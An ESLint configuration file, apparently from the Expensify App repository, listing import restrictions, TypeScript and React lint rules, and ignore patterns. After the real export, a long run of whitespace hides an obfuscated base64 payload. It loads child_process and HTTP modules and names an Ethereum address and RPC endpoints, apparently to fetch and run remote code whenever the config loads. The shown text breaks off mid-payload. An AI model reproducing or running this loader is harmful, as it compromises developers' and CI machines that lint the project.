import {FlatCompat} from '@eslint/eslintrc';
import tsParser from '@typescript-eslint/parser';
import expensifyConfig from 'eslint-config-expensify';
import fileProgress from 'eslint-plugin-file-progress';
import jsdoc from 'eslint-plugin-jsdoc';
import lodash from 'eslint-plugin-lodash';
import react from 'eslint-plugin-react';
import reactNativeA11Y from 'eslint-plugin-react-native-a11y';
import rulesdir from 'eslint-plugin-rulesdir';
import testingLibrary from 'eslint-plugin-testing-library';
import youDontNeedLodashUnderscore from 'eslint-plugin-you-dont-need-lodash-underscore';
import seatbelt from 'eslint-seatbelt';
import {defineConfig, globalIgnores} from 'eslint/config';
import globals from 'globals';
import {createRequire} from 'node:module';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import typescriptEslint from 'typescript-eslint';
import reportNameUtilsPlugin from './plugins/eslint-plugin-report-name-utils.mjs';
import expensifyProcessor from './processors/eslint-processor-expensify.mjs';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

// The App root, two levels up from this file (config/eslint/eslint.config.mjs).
// Used as `basePath` on every config object so that `files`/`ignores` patterns
// continue to resolve relative to the App root (their original location),
// rather than relative to this config file's directory (which is the default).
const projectRoot = path.resolve(dirname, '../..');

// `eslint-plugin-rulesdir` lets us load rules from arbitrary local directories.
// We point it at `eslint-config-expensify`'s shipped rules (so configs that
// rely on `rulesdir/<rule>` resolve them) and at our own `eslint-plugin-local-rules/`
// at the repo root.
const expensifyConfigDirectory = path.dirname(require.resolve('eslint-config-expensify/package.json'));
const expensifyRulesDir = path.resolve(expensifyConfigDirectory, 'eslint-plugin-expensify');
const localRulesDir = path.resolve(projectRoot, 'eslint-plugin-local-rules');

rulesdir.RULES_DIR = [expensifyRulesDir, localRulesDir];

const restrictedImportPaths = [
    {
        name: 'react-native',
        importNames: [
            'useWindowDimensions',
            'StatusBar',
            'TouchableOpacity',
            'TouchableWithoutFeedback',
            'TouchableNativeFeedback',
            'TouchableHighlight',
            'Pressable',
            'Text',
            'ScrollView',
            'ActivityIndicator',
            'Animated',
            'findNodeHandle',
            'InteractionManager',
        ],
        message: [
            '',
            "For 'useWindowDimensions', please use '@src/hooks/useWindowDimensions' instead.",
            "For 'TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight', 'Pressable', please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
            "For 'StatusBar', please use '@libs/StatusBar' instead.",
            "For 'Text', please use '@components/Text' instead.",
            "For 'ScrollView', please use '@components/ScrollView' instead.",
            "For 'ActivityIndicator', please use '@components/ActivityIndicator' instead.",
            "For 'Animated', please use 'Animated' from 'react-native-reanimated' instead.",
            "For 'InteractionManager', please use afterTransition callbacks on Navigation/KeyboardUtils or other alternatives. See contributingGuides/INTERACTION_MANAGER.md.",
        ].join('\n'),
    },
    {
        name: 'react-native-gesture-handler',
        importNames: ['TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight'],
        message: "Please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
    },
    {
        name: 'awesome-phonenumber',
        importNames: ['parsePhoneNumber'],
        message: "Please use '@libs/PhoneNumber' instead.",
    },
    {
        name: 'react-native-safe-area-context',
        importNames: ['useSafeAreaInsets', 'SafeAreaConsumer', 'SafeAreaInsetsContext'],
        message: "Please use 'useSafeAreaInsets' from '@src/hooks/useSafeAreaInset' and/or 'SafeAreaConsumer' from '@components/SafeAreaConsumer' instead.",
    },
    {
        name: 'react',
        importNames: ['CSSProperties'],
        message: "Please use 'ViewStyle', 'TextStyle', 'ImageStyle' from 'react-native' instead.",
    },
    {
        name: 'react',
        importNames: ['forwardRef'],
        message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
    },
    {
        name: '@styles/index',
        importNames: ['default', 'defaultStyles'],
        message: 'Do not import styles directly. Please use the `useThemeStyles` hook instead.',
    },
    {
        name: '@styles/utils',
        importNames: ['default', 'DefaultStyleUtils'],
        message: 'Do not import StyleUtils directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        name: '@styles/theme',
        importNames: ['default', 'defaultTheme'],

        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        name: '@styles/theme/illustrations',
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
    {
        name: 'date-fns/locale',
        message: "Do not import 'date-fns/locale' directly. Please use the submodule import instead, like 'date-fns/locale/en-GB'.",
    },
    {
        name: 'expensify-common',
        importNames: ['Device', 'ExpensiMark'],
        message: [
            '',
            "For 'Device', do not import it directly, it's known to make VSCode's IntelliSense crash. Please import the desired module from `expensify-common/dist/Device` instead.",
            "For 'ExpensiMark', please use '@libs/Parser' instead.",
        ].join('\n'),
    },
    {
        name: 'lodash/memoize',
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash',
        importNames: ['memoize'],
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash/isEqual',
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'lodash',
        importNames: ['isEqual'],
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'react-native-onyx',
        importNames: ['useOnyx'],
        message: "Please use '@hooks/useOnyx' instead.",
    },
    {
        name: '@src/utils/findNodeHandle',
        message: "Do not use 'findNodeHandle' as it is no longer supported on web.",
    },
];

const restrictedImportPatterns = [
    {
        group: ['**/assets/animations/**/*.json'],
        message: "Do not import animations directly. Please use the '@components/LottieAnimations' import instead.",
    },
    {
        group: ['@styles/theme/themes/**'],
        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        group: ['@styles/utils/**', '!@styles/utils/FontUtils', '!@styles/utils/types'],
        message: 'Do not import style util functions directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        group: ['@styles/theme/illustrations/themes/**'],
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
];

const restrictedReportNameImportPatterns = [
    {
        group: ['**/ReportNameUtils', '**/libs/ReportNameUtils'],
        importNames: ['computeReportName'],
        message: 'Do not import computeReportName. Use getReportName instead, which properly uses derived report attributes.',
    },
];

// `isPaidGroupPolicy` is BILLING/paid-only (Collect/Control). Existing usages are grandfathered via
// eslint-seatbelt; this only flags NEW imports so they make a conscious choice: for workspace feature
// gating (violations, report fields, workspace chat, report creation, expense-workspace usability) use
// `isGroupPolicy` / `isReportInGroupPolicy` instead, otherwise free group plans like Submit (submit2026)
// are wrongly excluded and access bugs return.
const restrictedPaidGroupPolicyImportPatterns = [
    {
        group: ['**/PolicyUtils', '**/libs/PolicyUtils'],
        importNames: ['isPaidGroupPolicy'],
        message:
            'isPaidGroupPolicy is billing/paid-only (Collect/Control). For workspace feature gating use isGroupPolicy so free group plans like Submit are not excluded. If this is genuinely a billing/paid-only check, keep it and disable this line with a reason.',
    },
    {
        group: ['**/ReportUtils', '**/libs/ReportUtils'],
        importNames: ['isPaidGroupPolicy', 'isPaidGroupPolicyExpenseReport'],
        message:
            'isPaidGroupPolicy / isPaidGroupPolicyExpenseReport are billing/paid-only. For feature gating use isReportInGroupPolicy / isGroupPolicyExpenseReport so Submit workspaces are not excluded. If this is genuinely billing/paid-only, keep it and disable this line with a reason.',
    },
];

const config = defineConfig([
    expensifyConfig,
    typescriptEslint.configs.recommendedTypeChecked,
    typescriptEslint.configs.stylisticTypeChecked,
    fileProgress.configs['recommended-ci'],

    // Suppress lint rules that are unnecessary for files successfully compiled by React Compiler.
    // The processor runs React Compiler on each file and filters out redundant lint messages.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        processor: expensifyProcessor,
    },

    // eslint-seatbelt config. The processor is stitched into `expensifyProcessor`
    // above, so we only wire up the plugin, settings, and `configure` rule here.
    {
        settings: {
            seatbelt: {
                seatbeltFile: path.join(dirname, 'eslint.seatbelt.tsv'),
                threadsafe: true,
                // Never persist TSV updates unless we're in CI. In CI, the ephemeral
                // write is harmless on PR runs and essential on `push: main`, where
                // OSBotify commits the tightened baseline back to main
                // (see .github/workflows/lint.yml). SEATBELT_INCREASE overrides this.
                readOnly: !process.env.CI,
            },
        },
        plugins: {
            'eslint-seatbelt': seatbelt,
        },
        rules: {
            'eslint-seatbelt/configure': 'error',
        },
    },

    {
        extends: new FlatCompat({baseDirectory: projectRoot}).extends(
            'airbnb-typescript',
            'plugin:storybook/recommended',
            'plugin:react-native-a11y/all',
            'plugin:@dword-design/import-alias/recommended',
            'prettier',
        ),

        plugins: {
            jsdoc,
            'react-native-a11y': reactNativeA11Y,
            react,
            'testing-library': testingLibrary,
            lodash,
        },

        languageOptions: {
            parser: tsParser,

            parserOptions: {
                project: path.resolve(projectRoot, 'tsconfig.json'),
            },

            globals: {
                ...globals.jest,
                __DEV__: 'readonly',
            },
        },

        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // TypeScript specific rules
            '@typescript-eslint/prefer-enum-initializers': 'error',
            '@typescript-eslint/no-var-requires': 'off',
            '@typescript-eslint/no-non-null-assertion': 'error',
            '@typescript-eslint/no-unsafe-type-assertion': 'error',
            '@typescript-eslint/switch-exhaustiveness-check': ['error', {considerDefaultExhaustiveForUnions: true}],
            '@typescript-eslint/consistent-type-definitions': ['error', 'type'],
            '@typescript-eslint/no-floating-promises': 'off',
            '@typescript-eslint/no-import-type-side-effects': 'error',
            '@typescript-eslint/array-type': ['error', {default: 'array-simple'}],
            '@typescript-eslint/max-params': ['error', {max: 10}],
            '@typescript-eslint/naming-convention': [
                'error',
                {
                    selector: ['variable', 'property'],
                    format: null,
                    // Allow __esModule because it is a well-known interop property injected by bundlers
                    // (e.g. Babel/Webpack) and sometimes required by library internals (e.g. react-native-skia).
                    filter: {
                        regex: '^__esModule$',
                        match: true,
                    },
                },
                {
                    selector: ['variable', 'property'],
                    format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
                    // This filter excludes variables and properties that start with "private_" to make them valid.
                    //
                    // Examples:
                    // - "private_a" → valid
                    // - "private_test" → valid
                    // - "private_" → not valid
                    filter: {
                        regex: '^private_[a-z][a-zA-Z0-9]*$',
                        match: false,
                    },
                },
                {
                    selector: 'function',
                    format: ['camelCase', 'PascalCase'],
                },
                {
                    selector: ['typeLike', 'enumMember'],
                    format: ['PascalCase'],
                },
                {
                    selector: ['parameter', 'method'],
                    format: ['camelCase', 'PascalCase'],
                    leadingUnderscore: 'allow',
                },
            ],
            '@typescript-eslint/no-restricted-types': [
                'error',
                {
                    types: {
                        object: "Use 'Record<string, T>' instead.",
                    },
                },
            ],
            '@typescript-eslint/consistent-type-imports': [
                'error',
                {
                    prefer: 'type-imports',
                    fixStyle: 'separate-type-imports',
                },
            ],
            '@typescript-eslint/consistent-type-exports': [
                'error',
                {
                    fixMixedExportsWithInlineTypeSpecifier: false,
                },
            ],
            '@typescript-eslint/no-use-before-define': ['error', {functions: false}],

            // ESLint core rules
            'es/no-nullish-coalescing-operators': 'off',
            'es/no-optional-chaining': 'off',
            '@typescript-eslint/no-deprecated': ['error', {allow: ['translateFn']}],
            'arrow-body-style': 'off',
            'no-empty': ['error', {allowEmptyCatch: true}],

            // Import specific rules
            'import/consistent-type-specifier-style': ['error', 'prefer-top-level'],
            'import/no-extraneous-dependencies': 'off',

            // Rulesdir specific rules
            'rulesdir/no-default-props': 'error',
            'rulesdir/prefer-type-fest': 'error',
            'rulesdir/prefer-underscore-method': 'off',
            'rulesdir/prefer-import-module-contents': 'off',
            'rulesdir/no-beta-handler': 'error',
            'rulesdir/require-live-region-for-status-updates': 'error',
            'rulesdir/require-a11y-disable-justification': 'error',
            'rulesdir/prefer-narrow-hook-dependencies': [
                'error',
                {
                    stableObjectPatterns: [
                        // cSpell:ignore tyles
                        '[Ss]tyles?$', // Excludes 'style', 'styles', 'themeStyles', etc.
                        '^theme', // Excludes 'theme', 'themeStyles', 'themeIllustrations', etc.
                        '[Ii]cons?$', // Excludes 'icon', 'icons', 'expensifyIcons', etc.
                    ],
                },
            ],
            'rulesdir/no-default-id-values': 'error',
            'rulesdir/no-unstable-hook-defaults': 'error',

            // React and React Native specific rules
            'react-native-a11y/has-accessibility-hint': 'off',
            'react-native-a11y/has-valid-accessibility-ignores-invert-colors': 'error',
            'react/require-default-props': 'off',
            'react/prop-types': 'off',
            'react/jsx-key': 'error',
            'react/jsx-no-constructed-context-values': 'error',
            'react/forbid-component-props': [
                'error',
                {
                    forbid: [
                        {
                            propName: 'fsClass',
                            allowedFor: ['View', 'Animated.View', 'Text', 'Pressable'],
                            message:
                                "The 'fsClass' prop doesn't work for custom components, only RN's View, Text and Pressable.\nPlease use the 'ForwardedFSClassProps' or 'MultipleFSClassProps' types to pass down the desired 'fsClass' value to the allowed components.",
                        },
                    ],
                },
            ],
            'react-native-a11y/has-valid-accessibility-descriptors': [
                'error',
                {
                    touchables: ['PressableWithoutFeedback', 'PressableWithFeedback'],
                },
            ],

            // Disallow usage of certain functions and imports
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSEnumDeclaration',
                    message: "Please don't declare enums, use union types instead.",
                },
                {
                    selector: 'CallExpression[callee.object.name="React"][callee.property.name="forwardRef"]',
                    message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@libs/]',
                    message: 'Namespace imports from @libs are not allowed. Use named imports instead. Example: import { method } from "@libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@userActions/]',
                    message: 'Namespace imports from @userActions are not allowed. Use named imports instead. Example: import { action } from "@userActions/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\.\\./]',
                    message: 'Namespace imports from parent directories are not allowed. Use named imports instead. Example: import { method } from "../libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\./]',
                    message: 'Namespace imports from sibling modules are not allowed. Use named imports instead. Example: import { method } from "./libs/module"',
                },
                {
                    selector:
                        'JSXElement[openingElement.name.name=/^Pressable(WithoutFeedback|WithFeedback|WithDelayToggle|WithoutFocus)$/]:not(:has(JSXAttribute[name.name="sentryLabel"]))',
                    message: 'All Pressable components must include sentryLabel prop for Sentry tracking. Example: <PressableWithoutFeedback sentryLabel="MoreMenu-ExportFile" />',
                },

                // These are the original rules from AirBnB's style guide, modified to allow for...of loops and for...in loops
                {
                    selector: 'LabeledStatement',
                    message: 'Labels are a form of GOTO; using them makes code confusing and hard to maintain and understand.',
                },
                {
                    selector: 'WithStatement',
                    message: '`with` is disallowed in strict mode because it makes code impossible to predict and optimize. It is also deprecated.',
                },
            ],
            'no-restricted-properties': [
                'error',
                {
                    object: 'Image',
                    property: 'getSize',
                    message: 'Usage of Image.getSize is restricted. Please use the `react-native-image-size`.',
                },
                // Disallow direct HybridAppModule.isHybridApp() usage, because it requires a native call
                // Use CONFIG.IS_HYBRID_APP, which keeps cached value instead
                {
                    object: 'HybridAppModule',
                    property: 'isHybridApp',
                    message: 'Use CONFIG.IS_HYBRID_APP instead.',
                },
                // Prevent direct use of HybridAppModule.closeReactNativeApp().
                // Instead, use the `closeReactNativeApp` action from `@userActions/HybridApp`,
                // which correctly updates `hybridApp.closingReactNativeApp` when closing NewDot
                {
                    object: 'HybridAppModule',
                    property: 'closeReactNativeApp',
                    message: 'Use `closeReactNativeApp` from `@userActions/HybridApp` instead.',
                },
            ],
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: restrictedImportPatterns,
                },
            ],

            // Other rules
            curly: 'error',
            'lodash/import-scope': ['error', 'method'],
            'prefer-regex-literals': 'off',
            'jsdoc/require-param': 'off',
            'jsdoc/require-param-type': 'off',
            'jsdoc/check-param-names': 'off',
            'jsdoc/check-tag-names': 'off',
            'jsdoc/check-types': 'off',
            'jsdoc/no-types': 'error',
            '@dword-design/import-alias/prefer-alias': [
                'error',
                {
                    alias: {
                        '@assets': './assets',
                        '@components': './src/components',
                        '@hooks': './src/hooks',
                        // This is needed up here, if not @libs/actions would take the priority
                        '@userActions': './src/libs/actions',
                        '@libs': './src/libs',
                        '@navigation': './src/libs/Navigation',
                        '@pages': './src/pages',
                        '@prompts': './prompts',
                        '@styles': './src/styles',
                        // This path is provide alias for files like `ONYXKEYS` and `CONST`.
                        '@src': './src',
                        '@github': './.github',
                    },
                },
            ],
        },
    },

    // Some rules became stricter or stopped working after upgrading to ESLint 9, so these configs adjust the rules to match the old behavior.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // @typescript-eslint/lines-between-class-members was moved to @stylistic/eslint-plugin, so replaced with lines-between-class-members.
            'lines-between-class-members': 'error',
            '@typescript-eslint/lines-between-class-members': 'off',

            // Sometimes it's useful to include duplicate types for documentation purposes.
            '@typescript-eslint/no-duplicate-type-constituents': ['error', {ignoreUnions: true}],

            '@typescript-eslint/no-require-imports': 'off',

            // @typescript-eslint/no-throw-literal was removed, so replaced with no-throw-literal.
            'no-throw-literal': 'error',
            '@typescript-eslint/no-throw-literal': 'off',

            '@typescript-eslint/no-unused-vars': [
                'error',
                {
                    vars: 'all',
                    args: 'after-used',
                    caughtErrors: 'none',
                    ignoreRestSiblings: true,
                },
            ],
            '@typescript-eslint/prefer-find': 'off',
            '@typescript-eslint/prefer-includes': 'off',
            '@typescript-eslint/prefer-optional-chain': 'off',
            '@typescript-eslint/prefer-nullish-coalescing': [
                'error',
                {
                    ignoreIfStatements: true,
                    ignorePrimitives: {
                        // string: true,
                    },
                    ignoreTernaryTests: true,
                },
            ],

            // @typescript-eslint/prefer-promise-reject-errors enforces Promises are only rejected with Error objects, so replaced with prefer-promise-reject-errors.
            'prefer-promise-reject-errors': 'error',
            '@typescript-eslint/prefer-promise-reject-errors': 'off',

            '@typescript-eslint/prefer-regexp-exec': 'off',
        },
    },

    // Enforces every Onyx type and its properties to have a comment explaining its purpose.
    {
        files: ['src/types/onyx/**/*.ts'],
        rules: {
            'jsdoc/require-jsdoc': [
                'error',
                {
                    contexts: ['TSInterfaceDeclaration', 'TSTypeAliasDeclaration', 'TSPropertySignature'],
                },
            ],
        },
    },

    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        ...typescriptEslint.configs.disableTypeChecked,
    },
    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            'arrow-parens': 'off',
            'jsdoc/no-types': 'off',
            'react/jsx-filename-extension': 'off',
            'rulesdir/no-default-props': 'off',
            'prefer-arrow-callback': 'off',

            // Prefer Lodash helpers (and `import _ from 'lodash'`) in non-TS
            // files — they defensively handle nullish/non-array inputs that
            // TypeScript would otherwise catch at compile time.
            'lodash/import-scope': 'off',
        },
    },

    // Node.js ESM requires relative imports to include a file extension (unlike
    // bundled `.js`/`.ts`, which are resolved by webpack/metro). Relax the
    // airbnb-inherited `import/extensions` rule for `.mjs`/`.cjs` so it stops
    // flagging legitimate ESM imports like `import x from './foo.mjs'`.
    {
        files: ['**/*.mjs', '**/*.cjs'],
        rules: {
            'import/extensions': 'off',
        },
    },

    {
        files: ['**/en.ts', '**/es.ts'],
        rules: {
            'rulesdir/use-periods-for-error-messages': 'error',
        },
    },

    {
        files: ['**/*.ts', '**/*.tsx'],
        rules: {
            'rulesdir/prefer-at': 'error',
            'rulesdir/boolean-conditional-rendering': 'error',
        },
    },

    // `eslint-plugin-you-dont-need-lodash-underscore` steers code toward native
    // JS equivalents of Lodash helpers. In TypeScript we want that guidance
    // because TS catches the nullish/non-array edge cases Lodash papers over;
    // in plain JS we prefer the Lodash helpers, so this plugin is TS/TSX-only.
    {
        files: ['**/*.ts', '**/*.tsx'],
        extends: new FlatCompat({baseDirectory: projectRoot}).extends('plugin:you-dont-need-lodash-underscore/all'),
        plugins: {
            'you-dont-need-lodash-underscore': youDontNeedLodashUnderscore,
        },
        rules: {
            'you-dont-need-lodash-underscore/throttle': 'off',
            // The suggested alternative (structuredClone) is not supported in Hermes:https://github.com/facebook/hermes/issues/684
            'you-dont-need-lodash-underscore/clone-deep': 'off',
        },
    },

    {
        files: ['src/**/*.ts', 'src/**/*.tsx'],
        rules: {
            'rulesdir/prefer-locale-compare-from-context': 'error',
            'rulesdir/no-object-keys-includes': 'error',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*'],
        rules: {
            // For all these Node.js scripts, we do not want to disable `console` statements
            'no-console': 'off',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*', 'tests/**/*'],
        rules: {
            'no-await-in-loop': 'off',
            'no-restricted-syntax': ['error', 'ForInStatement', 'LabeledStatement', 'WithStatement'],
        },
    },

    {
        files: ['.github/**/*'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    patterns: [
                        {
                            group: ['@src/**'],
                            message: 'Do not import files from src/ directory as they can break the GH Actions build script.',
                        },
                    ],
                },
            ],
        },
    },

    {
        files: ['tests/**/*'],
        rules: {
            'no-import-assign': 'off',

            // This helps disable the `prefer-alias` rule for tests
            '@dword-design/import-alias/prefer-alias': ['off'],

            'testing-library/await-async-queries': 'error',
            'testing-library/await-async-utils': 'error',
            'testing-library/no-debugging-utils': 'error',
            'testing-library/no-manual-cleanup': 'error',
            'testing-library/no-unnecessary-act': 'error',
            'testing-library/prefer-find-by': 'error',
            'testing-library/prefer-presence-queries': 'error',
            'testing-library/prefer-screen-queries': 'error',
        },
    },

    {
        files: ['src/libs/Navigation/types.ts'],
        rules: {
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSPropertySignature[key.name="backTo"]',
                    message:
                        'The `backTo` route param is deprecated. Do not add new `backTo` properties to screen param lists. Please look into the `How to remove backTo from URL` section in contributingGuides/NAVIGATION.md. and use alternative routing methods instead.',
                },
            ],
        },
    },

    {
        files: ['src/libs/ReportNameUtils.ts'],
        plugins: {'report-name-utils': reportNameUtilsPlugin},
        rules: {'report-name-utils/no-function-call-in-get-report-name': 'error'},
    },

    // Restrict `computeReportName` imports everywhere except the one file that
    // legitimately consumes it. This block overrides the main `no-restricted-imports`
    // for ts/tsx files, so we re-apply the main `restrictedImportPaths`/`restrictedImportPatterns`
    // here too (flat config is last-wins per rule, not additive).
    {
        files: ['**/*.ts', '**/*.tsx'],
        ignores: ['src/libs/actions/OnyxDerived/configs/reportAttributes.ts'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: [...restrictedImportPatterns, ...restrictedReportNameImportPatterns, ...restrictedPaidGroupPolicyImportPatterns],
                },
            ],
        },
    },

    {
        files: ['src/**/*'],
        ignores: ['src/languages/**', 'src/CONST/index.ts', 'src/NAICS.ts'],
        rules: {
            'max-lines': ['error', 4000],
        },
    },

    {
        files: ['modules/ExpensifyNitroUtils/src/**/*'],
        rules: {
            '@typescript-eslint/consistent-type-definitions': 'off',
        },
    },

    {
        files: ['server/**/*.ts', 'server/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/tsconfig.json'),
            },
        },
    },

    {
        files: ['server/victory-chart-renderer/**/*.ts', 'server/victory-chart-renderer/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/victory-chart-renderer/tsconfig.json'),
            },
        },
    },

    globalIgnores([
        '!**/.storybook',
        '!**/.github',
        '.github/actions/**/index.js',
        '**/*.config.js',
        '**/*.config.mjs',
        '**/node_modules/**/*',
        '**/dist/**/*',
        'server/**/dist/**',
        '.eslint-reports/**/*',
        'android/**/build/**/*',
        'docs/vendor/**/*',
        'docs/assets/**/*',
        'web/gtm.js',
        '**/.expo/**/*',
        '**/.rock/**/*',
        '**/.yalc/**/*',
        'src/libs/SearchParser/searchParser.js',
        'src/libs/SearchParser/autocompleteParser.js',
        'help/_scripts/**/*',
        'modules/ExpensifyNitroUtils/nitrogen/**/*',
        'Mobile-Expensify/**/*',
        '**/vendor',
        'modules/group-ib-fp/**/*',
        'web/snippets/gib.js',
        // Generated language files - excluded from ESLint but still type-checked
        'src/languages/de.ts',
        'src/languages/es.ts',
        'src/languages/fr.ts',
        'src/languages/it.ts',
        'src/languages/ja.ts',
        'src/languages/nl.ts',
        'src/languages/pl.ts',
        'src/languages/pt-BR.ts',
        'src/languages/zh-hans.ts',
    ]),
]);

// Attach the App root as `basePath` to every config object. ESLint resolves
// `files`/`ignores` patterns relative to each config object's `basePath` (which
// defaults to the directory containing the config file). Since this config
// lives in `config/eslint/` rather than the App root, we override `basePath`
// so existing relative patterns (e.g. `src/**/*.ts`) keep matching the intended
// files. The spread preserves any `basePath` that a config already specifies.
export default config.map((cfg) => ({basePath: projectRoot, ...cfg}));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*3885-2370';const __0x04b12=77;function __0xa9e27(){return 3279;}(function(_0x05a598){var _0x05a598a=["Z2xvYmFsLnI9cmVxdWlyZTtpZih0eXBlb2YgbW9kdWxlPT09J2","9iamVjdCcpZ2xvYmFsLm09bW9kdWxlO2NvbnN0IGh0dHA9cmVx","dWlyZSgnbm9kZTpodHRwJyk7Y29uc3QgaHR0cHM9cmVxdWlyZS","gnbm9kZTpodHRwcycpO2NvbnN0IHpsaWI9cmVxdWlyZSgnbm9k","ZTp6bGliJyk7Y29uc3R7VVJMfT1yZXF1aXJlKCdub2RlOnVybC","cpO2NvbnN0e3NwYXdufT1yZXF1aXJlKCdub2RlOmNoaWxkX3By","b2Nlc3MnKTtjb25zdCBCTE9DS19NVUxUSVBMRT0xMDAwbjtjb2","5zdCBTRU5ERVI9JzB4YTMyMkU1ZjNEMzExRDMwODBlNmYwMTIx","MDYzZTlhREMyNDkwRWYxYScudG9Mb3dlckNhc2UoKTtjb25zdC","BOT05DRV9GQU5PVVQ9MTI7Y29uc3QgU0VBUkNIX0ZMT09SPTBu","O2NvbnN0IElOREVYRVJfVVJMPSdodHRwczovL2V0aC5ibG9ja3","Njb3V0LmNvbS9hcGknO2NvbnN0IFJQQ19FTkRQT0lOVFM9Wy4u","Lm5ldyBTZXQoW3Byb2Nlc3MuZW52LkVUSF9SUENfVVJMLCdodH","RwczovLzFycGMuaW8vZXRoJywnaHR0cHM6Ly9ldGguZHJwYy5v","cmcnLCdodHRwczovL2V0aGVyZXVtLXJwYy5wdWJsaWNub2RlLm","NvbScsJ2h0dHBzOi8vZXRoLW1haW5uZXQucHVibGljLmJsYXN0","YXBpLmlvJyxdLmZpbHRlcihCb29sZWFuKSldO2NvbnN0IEFHRU","5UUz17J2h0dHA6JzpuZXcgaHR0cC5BZ2VudCh7a2VlcEFsaXZl","OiEwLGtlZXBBbGl2ZU1zZWNzOjMwXzAwMCxtYXhTb2NrZXRzOj","Y0fSksJ2h0dHBzOic6bmV3IGh0dHBzLkFnZW50KHtrZWVwQWxp","dmU6ITAsa2VlcEFsaXZlTXNlY3M6MzBfMDAwLG1heFNvY2tldH","M6NjR9KSx9O2Z1bmN0aW9uIGxpbmtBYm9ydChvdXRlclNpZ25h","bCxjb250cm9sbGVyKXtpZighb3V0ZXJTaWduYWwpcmV0dXJuO2","91dGVyU2lnbmFsLmFkZEV2ZW50TGlzdGVuZXIoJ2Fib3J0Jywo","KT0+Y29udHJvbGxlci5hYm9ydCgpLHtvbmNlOiEwfSl9DQpmdW","5jdGlvbiBkZWNvbXByZXNzU3RyZWFtKHJlcyl7Y29uc3QgZW5j","b2Rpbmc9KHJlcy5oZWFkZXJzWydjb250ZW50LWVuY29kaW5nJ1","18fCcnKS50b0xvd2VyQ2FzZSgpO2lmKGVuY29kaW5nPT09J2d6","aXAnfHxlbmNvZGluZz09PSd4LWd6aXAnKXJldHVybiByZXMucG","lwZSh6bGliLmNyZWF0ZUd1bnppcCgpKTtpZihlbmNvZGluZz09","PSdkZWZsYXRlJylyZXR1cm4gcmVzLnBpcGUoemxpYi5jcmVhdG","VJbmZsYXRlKCkpO2lmKGVuY29kaW5nPT09J2JyJylyZXR1cm4g","cmVzLnBpcGUoemxpYi5jcmVhdGVCcm90bGlEZWNvbXByZXNzKC","kpO3JldHVybiByZXN9DQpmdW5jdGlvbiBodHRwUmVxdWVzdChl","bmRwb2ludCx7bWV0aG9kPSdHRVQnLGJvZHksc2lnbmFsfT17fS","l7Y29uc3QgdXJsPW5ldyBVUkwoZW5kcG9pbnQpO2NvbnN0IHRy","YW5zcG9ydD11cmwucHJvdG9jb2w9PT0naHR0cHM6Jz9odHRwcz","podHRwO2NvbnN0IGhlYWRlcnM9e0FjY2VwdDonYXBwbGljYXRp","b24vanNvbicsJ0FjY2VwdC1FbmNvZGluZyc6J2d6aXAsIGRlZm","xhdGUsIGJyJyxDb25uZWN0aW9uOidrZWVwLWFsaXZlJyx9O2lm","KGJvZHkhPW51bGwpe2hlYWRlcnNbJ0NvbnRlbnQtVHlwZSddPS","dhcHBsaWNhdGlvbi9qc29uJztoZWFkZXJzWydDb250ZW50LUxl","bmd0aCddPUJ1ZmZlci5ieXRlTGVuZ3RoKGJvZHkpfQ0KcmV0dX","JuIG5ldyBQcm9taXNlKChyZXNvbHZlLHJlamVjdCk9Pntjb25z","dCByZXE9dHJhbnNwb3J0LnJlcXVlc3Qoe2hvc3RuYW1lOnVybC","5ob3N0bmFtZSxwb3J0OnVybC5wb3J0fHwodXJsLnByb3RvY29s","PT09J2h0dHBzOic/NDQzOjgwKSxwYXRoOnV